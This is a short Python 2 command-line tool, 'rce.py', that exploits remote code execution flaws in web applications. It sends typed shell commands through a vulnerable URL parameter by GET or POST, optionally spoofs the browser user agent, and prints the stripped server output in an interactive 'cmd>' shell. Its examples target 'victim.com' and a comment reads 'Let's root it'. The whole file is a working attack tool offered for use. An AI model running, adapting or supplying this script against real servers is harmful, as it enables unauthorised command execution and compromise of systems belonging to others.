#!/usr/bin/env python
#
# Remote Code Execution
#

import sys, urllib, re, urlparse
import getopt

# Overload the user agent
class AppURLopener(urllib.FancyURLopener):
    version = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0"

def usage():
  print """ 
rce.py - Remote Code Execution

Usage:
  ./rce.py [options] ur<rce>l
Options:
  -p    - Use POST method instead of GET. Enter url as GET.
  -u    - Overload user agent.
  -h    - Help. This menu.
  <rce> - Location of vulnerable parameter.
Example:
  ./rce.py 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload.
  ./rce.py -u 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload and overwrite the user agent.
  ./rce.py -p 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Parses the parameters from the url and sends the attack as a POST request, replacing '<rce>' with the payload.
  """
  sys.exit()

# Common init
base_url = ''
post = False

try:
    opts, args = getopt.getopt(sys.argv[1:], "hpu")
except getopt.GetoptError as err:
    print str(err)
    sys.exit()

for o,a in opts:
    if o in ("-h"):
      usage()
    elif o in ("-p"):
      post = True
    elif o in ("-u"):
        urllib._urlopener = AppURLopener()

if len(args) != 1 :
  print "No URL provided"
  sys.exit()

if args[0].find('://') == -1:
  print "Not a valid URL"
  sys.exit()

base_url = args[0]

# Let's root it
print "Type 'exit' to quit."

while True:
  cmd = raw_input("cmd> ")

  if cmd.lower() == 'exit':
    sys.exit(2)

  url = base_url.replace('<rce>', cmd)
  if post:
    (ignore, ignore, ignore, params, ignore) = urlparse.urlsplit(url)
    site = url[:url.find(params)-1]
    result = urllib.urlopen(site, urllib.urlencode(params)).read()
  else:
    result = urllib.urlopen(url).read()

  result = re.sub("<\/*\w+?>", '', result)

  print '[*] Executed: %s\n%s' % (cmd, result)
